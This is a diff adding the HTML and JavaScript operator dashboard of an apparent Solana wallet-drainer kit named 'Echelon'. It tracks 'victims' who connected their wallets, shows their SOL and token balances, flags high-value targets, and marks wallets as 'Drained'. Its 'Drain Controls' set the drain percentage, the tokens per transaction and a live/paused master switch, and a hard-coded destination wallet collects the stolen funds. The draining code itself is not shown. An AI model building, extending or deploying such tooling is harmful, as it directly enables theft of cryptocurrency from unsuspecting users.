@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Echelon / Admin</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.0/lib/index.iife.min.js"></script>
+  <style>
+    :root { --bg:#05050a; --surface:rgba(255,255,255,0.03); --border:rgba(255,255,255,0.08); --text:#f1f1f5; --muted:#9a9ab0; --accent:#14f195; --accent-2:#9945ff; --warn:#ff6b6b; --gold:#ffd700; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { background:var(--bg); color:var(--text); font-family:'Inter',system-ui,sans-serif; padding:2rem; }
+    h1 { font-family:'Space Grotesk',sans-serif; font-size:1.9rem; color:var(--accent); margin-bottom:0.25rem; }
+    .sub { color:#555; font-size:0.85rem; margin-bottom:2rem; }
+    .summary { display:grid; grid-template-columns:repeat(4,1fr); gap:1rem; margin-bottom:2rem; }
+    @media(max-width:800px){ .summary { grid-template-columns:1fr 1fr; } }
+    .summary-card { background:var(--surface); border:1px solid var(--border); border-radius:16px; padding:1.25rem; text-align:center; }
+    .summary-card .num { font-family:'Space Grotesk',sans-serif; font-size:1.8rem; font-weight:700; }
+    .summary-card .lbl { color:var(--muted); font-size:0.75rem; text-transform:uppercase; letter-spacing:0.05em; margin-top:0.25rem; }
+    .grid { display:grid; grid-template-columns:1fr 1fr; gap:1.5rem; max-width:1400px; }
+    @media(max-width:900px){ .grid { grid-template-columns:1fr; } }
+    .card { background:var(--surface); border:1px solid var(--border); border-radius:16px; padding:1.5rem; margin-bottom:1.5rem; }
+    .card h2 { font-family:'Space Grotesk',sans-serif; font-size:1rem; text-transform:uppercase; letter-spacing:0.08em; color:var(--text); margin-bottom:1rem; }
+    .row { display:flex; justify-content:space-between; align-items:center; padding:0.6rem 0; border-bottom:1px solid rgba(255,255,255,0.04); }
+    .row:last-child { border:none; }
+    .label { color:var(--muted); font-size:0.85rem; }
+    .val { color:var(--accent); font-weight:700; }
+    .val-warn { color:var(--warn); font-weight:700; }
+    .btn { background:rgba(255,255,255,0.05); border:1px solid var(--border); color:#ccc; padding:0.5rem 1rem; border-radius:8px; cursor:pointer; font-family:'Inter',sans-serif; font-weight:600; transition:background 0.15s; }
+    .btn:hover { background:rgba(255,255,255,0.1); }
+    .btn-danger { background:rgba(255,107,107,0.08); border-color:rgba(255,107,107,0.2); color:var(--warn); }
+    .btn-danger:hover { background:rgba(255,107,107,0.15); }
+    input[type="number"],input[type="text"] { background:rgba(255,255,255,0.04); border:1px solid var(--border); color:#fff; padding:0.45rem 0.6rem; border-radius:6px; font-family:'JetBrains Mono',monospace; width:120px; text-align:right; }
+    input:focus { outline:none; border-color:var(--accent); }
+    .toggle-btn { width:auto; padding-left:1.2rem; padding-right:1.2rem; }
+    table { width:100%; border-collapse:collapse; font-size:0.82rem; }
+    th { text-align:left; color:#555; padding:0.5rem; border-bottom:1px solid var(--border); font-weight:600; }
+    td { padding:0.5rem; border-bottom:1px solid rgba(255,255,255,0.04); }
+    tr:hover { background:rgba(255,255,255,0.02); }
+    .wallet-link { color:var(--accent-2); text-decoration:none; }
+    .wallet-link:hover { text-decoration:underline; }
+    .badge { display:inline-block; padding:0.15rem 0.45rem; border-radius:4px; font-size:0.7rem; font-weight:700; }
+    .badge-new { background:rgba(20,241,149,0.1); color:var(--accent); }
+    .badge-drained { background:rgba(153,69,255,0.12); color:var(--accent-2); }
+    .filter-bar { display:flex; gap:0.5rem; margin-bottom:1rem; flex-wrap:wrap; }
+    .filter-bar input { flex:1; min-width:160px; text-align:left; }
+    #status { color:#555; font-size:0.8rem; margin-top:1rem; }
+    .muted { color:var(--muted); }
+    .high-value { background:rgba(255,215,0,0.04); }
+    .status-green { color:var(--accent); }
+    .status-red { color:var(--warn); }
+  </style>
+</head>
+<body>
+  <h1>echelon / admin</h1>
+  <p class="sub">destination wallet overview + live victim preview — mainnet</p>
+
+  <div class="summary">
+    <div class="summary-card"><div class="num" id="totalVictims">0</div><div class="lbl">Victims Connected</div></div>
+    <div class="summary-card"><div class="num" id="totalSol" style="color:var(--accent)">0</div><div class="lbl">Est. SOL</div></div>
+    <div class="summary-card"><div class="num" id="totalTokens">0</div><div class="lbl">Token Accounts</div></div>
+    <div class="summary-card"><div class="num" id="hiVal" style="color:var(--gold)">0</div><div class="lbl">High Value</div></div>
+  </div>
+
+  <div class="grid">
+    <div>
+      <div class="card">
+        <h2>Drain Controls</h2>
+        <div class="row"><span class="label">SOL Reserve (lamports)</span><input type="number" id="cfgSolReserve"></div>
+        <div class="row"><span class="label">SOL Drain %</span><input type="number" id="cfgSolPct" min="0" max="100" style="width:70px"></div>
+        <div class="row"><span class="label">Tokens Per TX</span><input type="number" id="cfgMaxTx" min="1" max="48" style="width:70px"></div>
+        <div class="row"><span class="label">Master Switch</span><button id="cfgToggleBtn" class="btn toggle-btn" onclick="toggleEnabled()">—</button></div>
+        <div style="margin-top:1rem">
+          <button class="btn" onclick="saveConfig()">Save Config</button>
+          <button class="btn" onclick="loadConfigFromServer()">Reload</button>
+        </div>
+        <p id="cfgStatus" style="color:var(--accent);font-size:0.8rem;margin-top:0.5rem;display:none"></p>
+      </div>
+
+      <div class="card">
+        <h2>Destination Wallet</h2>
+        <div class="row"><span class="label">Address</span><span class="val" id="walletAddr">AJ5obv...BFPM</span></div>
+        <div class="row"><span class="label">SOL Balance</span><span class="val" id="solBal">—</span></div>
+        <div class="row"><span class="label">USD Value</span><span class="val" id="usdVal">—</span></div>
+        <div class="row"><span class="label">Token Accounts</span><span class="val" id="tokenCount">—</span></div>
+        <div class="row"><span class="label">Status</span><span class="val" id="health">—</span></div>
+        <div style="margin-top:1rem">
+          <button class="btn" onclick="refreshWallet()">Refresh</button>
+          <button class="btn" onclick="window.open('https://solscan.io/account/AJ5obv7kqWiBCiqAAsqR9Anx9XEoKjnCVM4vKAgABFPM','_blank')">Solscan</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>Check Any Address</h2>
+        <div class="filter-bar">
+          <input type="text" id="lookupAddr" placeholder="Paste Solana address..." onkeydown="if(event.key==='Enter')lookupBalance()">
+          <button class="btn" onclick="lookupBalance()">Check</button>
+        </div>
+        <div id="lookupResults" style="display:none;margin-top:1rem">
+          <div class="row"><span class="label">SOL</span><span class="val" id="lookupSol">—</span></div>
+          <div class="row"><span class="label">Token Accounts</span><span class="val" id="lookupTokenCt">—</span></div>
+          <div id="lookupTokens" style="margin-top:0.75rem"></div>
+          <div style="margin-top:0.75rem"><a id="lookupSolscan" class="wallet-link" href="#" target="_blank">Open in Solscan &rarr;</a></div>
+        </div>
+        <p id="lookupStatus" style="color:#555;font-size:0.8rem;margin-top:0.5rem;display:none"></p>
+      </div>
+
+      <div class="card">
+        <h2>Recent Activity</h2>
+        <div id="txLog" style="color:#555;font-size:0.85rem">Scanning...</div>
+        <div style="margin-top:1rem"><button class="btn" onclick="checkRecent()">Check TXs</button></div>
+      </div>
+    </div>
+
+    <div>
+      <div class="card" style="overflow-x:auto">
+        <h2>Victim Preview</h2>
+        <div class="filter-bar">
+          <input type="text" id="filterInput" placeholder="Filter by address..." oninput="renderVictims()">
+          <button class="btn" onclick="pollVictims()">Refresh</button>
+          <button class="btn btn-danger" onclick="clearVictims()">Clear</button>
+        </div>
+        <table>
+          <thead><tr><th>Time</th><th>Address</th><th>SOL</th><th>Tokens</th><th>Status</th></tr></thead>
+          <tbody id="victimList"></tbody>
+        </table>
+        <p id="vicStatus" style="color:#555;font-size:0.8rem;margin-top:0.75rem">waiting for data...</p>
+      </div>
+    </div>
+  </div>
+
+  <p id="status">loading...</p>
+
+  <script>
+  var dest = "AJ5obv7kqWiBCiqAAsqR9Anx9XEoKjnCVM4vKAgABFPM";
+  var RPC = "https://api.mainnet-beta.solana.com";
+  var conn = null;
+  var _enabled = null;
+
+  async function loadConfigFromServer(){
+    try {
+      var r = await fetch("/api/config");
+      var cfg = await r.json();
+      document.getElementById("cfgSolReserve").value = cfg.solReserve;
+      document.getElementById("cfgSolPct").value = cfg.solPercentage;
+      document.getElementById("cfgMaxTx").value = cfg.maxPerTx;
+      _enabled = cfg.enabled;
+      var btn = document.getElementById("cfgToggleBtn");
+      btn.textContent = _enabled ? "LIVE" : "PAUSED";
+      btn.style.color = _enabled ? "#14f195" : "#ff6b6b";
+    } catch(e) {}
+  }
+
+  function toggleEnabled(){
+    _enabled = !_enabled;
+    var btn = document.getElementById("cfgToggleBtn");
+    btn.textContent = _enabled ? "LIVE" : "PAUSED";
+    btn.style.color = _enabled ? "#14f195" : "#ff6b6b";
+  }
+
+  async function saveConfig(){
+    var cfg = {
+      solReserve: parseInt(document.getElementById("cfgSolReserve").value) || 500000,
+      solPercentage: parseInt(document.getElementById("cfgSolPct").value) || 100,
+      maxPerTx: parseInt(document.getElementById("cfgMaxTx").value) || 24,
+      enabled: _enabled
+    };
+    try {
+      var r = await fetch("/api/config", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(cfg)});
+      var j = await r.json();
+      var s = document.getElementById("cfgStatus");
+      s.style.display = "block";
+      if(j.ok){ s.textContent = "✓ Config saved"; s.style.color = "#14f195"; }
+      else { s.textContent = "✗ Save failed"; s.style.color = "#ff6b6b"; }
+      setTimeout(function(){ s.style.display = "none"; }, 2000);
+    } catch(e) {
+      var s = document.getElementById("cfgStatus"); s.style.display = "block"; s.textContent = "✗ Save failed"; s.style.color = "#ff6b6b";
+    }
+  }
+
+  async function refreshWallet(){
+    document.getElementById("status").textContent = "loading...";
+    if(!conn) conn = new solanaWeb3.Connection(RPC, "confirmed");
+    try {
+      var pk = new solanaWeb3.PublicKey(dest);
+      var bal = await conn.getBalance(pk);
+      document.getElementById("solBal").textContent = (bal / 1e9).toFixed(6) + " SOL";
+      document.getElementById("health").textContent = "Connected";
+      document.getElementById("health").className = "val";
+      try {
+        var r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
+        var j = await r.json();
+        document.getElementById("usdVal").textContent = "$" + (bal / 1e9 * j.solana.usd).toFixed(2);
+      } catch(e) { document.getElementById("usdVal").textContent = "—"; }
+      try {
+        var tok = await conn.getParsedTokenAccountsByOwner(pk, {programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")});
+        document.getElementById("tokenCount").textContent = tok.value.length;
+      } catch(e) { document.getElementById("tokenCount").textContent = "0"; }
+      document.getElementById("status").textContent = "✓ updated " + new Date().toLocaleTimeString();
+    } catch(e) {
+      document.getElementById("health").textContent = "RPC error";
+      document.getElementById("health").className = "val-warn";
+      document.getElementById("status").textContent = "error: " + (e.message ? e.message.slice(0,60) : "");
+    }
+  }
+
+  async function checkRecent(){
+    document.getElementById("txLog").innerHTML = "scanning...";
+    try {
+      var pk = new solanaWeb3.PublicKey(dest);
+      var sigs = await conn.getSignaturesForAddress(pk, {limit:10});
+      if(sigs.length === 0){ document.getElementById("txLog").innerHTML = "No recent transactions."; return; }
+      var html = "";
+      for(var s of sigs){
+        var amt = s.err ? "FAILED" : "✓";
+        var d = s.blockTime ? new Date(s.blockTime * 1000).toLocaleDateString() : "?";
+        html += "<div style='padding:0.3rem 0;border-bottom:1px solid rgba(255,255,255,0.03);font-size:0.8rem'>" +
+          "<a href='https://solscan.io/tx/" + s.signature + "' target='_blank' class='wallet-link'>" + s.signature.slice(0,16) + "..</a> " +
+          "<span style='color:" + (s.err ? "#ff6b6b" : "#14f195") + "'>" + amt + "</span> " +
+          "<span style='color:#555'>" + d + "</span></div>";
+      }
+      document.getElementById("txLog").innerHTML = html;
+    } catch(e){ document.getElementById("txLog").innerHTML = "error fetching transactions"; }
+  }
+
+  var victims = [];
+  function formatTime(ts){ var d = new Date(ts); return d.toLocaleTimeString(); }
+  function truncateAddr(addr){ return addr.slice(0,4) + ".." + addr.slice(-4); }
+  function renderVictims(){
+    var filter = (document.getElementById("filterInput").value || "").toLowerCase();
+    var filtered = filter ? victims.filter(function(v){ return v.address && v.address.toLowerCase().includes(filter); }) : victims;
+    var tbody = document.getElementById("victimList");
+    tbody.innerHTML = "";
+    var totalKnownSol = 0, totalKnownTokens = 0, hiValCount = 0;
+    for(var i = filtered.length - 1; i >= 0; i--){
+      var v = filtered[i];
+      if(v.solBalance !== undefined) totalKnownSol += v.solBalance / 1e9;
+      if(v.tokenCount !== undefined) totalKnownTokens += v.tokenCount;
+      if(v.solBalance && v.solBalance > 10e9) hiValCount++;
+      var solDisplay = v.solBalance !== undefined ? (v.solBalance / 1e9).toFixed(3) : "?";
+      var tokDisplay = v.tokenCount !== undefined ? v.tokenCount : "?";
+      var statusBadge = v.drained ? '<span class="badge badge-drained">Drained</span>' : '<span class="badge badge-new">Live</span>';
+      var rowClass = v.solBalance && v.solBalance > 10e9 ? ' class="high-value"' : '';
+      tbody.innerHTML += "<tr" + rowClass + "><td style='color:#555'>" + formatTime(v.timestamp) + "</td>" +
+        "<td><a href='https://solscan.io/account/" + v.address + "' target='_blank' class='wallet-link'>" + truncateAddr(v.address) + "</a></td>" +
+        "<td" + (v.solBalance && v.solBalance > 10e9 ? " style='color:#ffd700'" : "") + ">" + solDisplay + "</td>" +
+        "<td>" + tokDisplay + "</td><td>" + statusBadge + "</td></tr>";
+    }
+    document.getElementById("totalVictims").textContent = filtered.length;
+    document.getElementById("totalSol").textContent = totalKnownSol.toFixed(2);
+    document.getElementById("totalTokens").textContent = totalKnownTokens;
+    document.getElementById("hiVal").textContent = hiValCount;
+    document.getElementById("vicStatus").textContent = filtered.length + " victim(s) shown" + (filter ? " (filtered)" : "");
+  }
+  async function pollVictims(){ try{ var resp = await fetch("/api/victims"); victims = await resp.json(); renderVictims(); }catch(e){} }
+  function clearVictims(){ victims = []; renderVictims(); }
+
+  async function lookupBalance(){
+    var addr = document.getElementById("lookupAddr").value.trim();
+    if(!addr) return;
+    var statusEl = document.getElementById("lookupStatus");
+    var resultsEl = document.getElementById("lookupResults");
+    statusEl.style.display = "block"; statusEl.textContent = "checking..."; resultsEl.style.display = "none";
+    try {
+      var pk = new solanaWeb3.PublicKey(addr);
+      if(!conn) conn = new solanaWeb3.Connection(RPC, "confirmed");
+      var [solBal, spl, spl22] = await Promise.all([
+        conn.getBalance(pk),
+        conn.getParsedTokenAccountsByOwner(pk, {programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")}),
+        conn.getParsedTokenAccountsByOwner(pk, {programId: new solanaWeb3.PublicKey("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb")})
+      ]);
+      document.getElementById("lookupSol").textContent = (solBal / 1e9).toFixed(6) + " SOL";
+      var allTokens = (spl.value || []).concat(spl22.value || []);
+      document.getElementById("lookupTokenCt").textContent = allTokens.length;
+      var tokenHTML = "";
+      for(var i = 0; i < allTokens.length; i++){
+        try {
+          var info = allTokens[i].account.data.parsed.info;
+          tokenHTML += '<div class="row"><span style="font-size:0.75rem;color:#666">' + info.mint.slice(0,8) + '..</span><span style="font-size:0.8rem;color:#ccc">' + (info.tokenAmount.uiAmount || 0) + '</span></div>';
+        } catch(e){}
+      }
+      document.getElementById("lookupTokens").innerHTML = tokenHTML || '<span style="color:#555;font-size:0.75rem">No tokens found</span>';
+      document.getElementById("lookupSolscan").href = "https://solscan.io/account/" + addr;
+      resultsEl.style.display = "block"; statusEl.style.display = "none";
+    } catch(e) {
+      statusEl.textContent = "Invalid address or RPC error";
+      resultsEl.style.display = "none";
+    }
+  }
+
+  setInterval(pollVictims, 3000);
+  refreshWallet();
+  loadConfigFromServer();
+  </script>
+</body>
+</html>
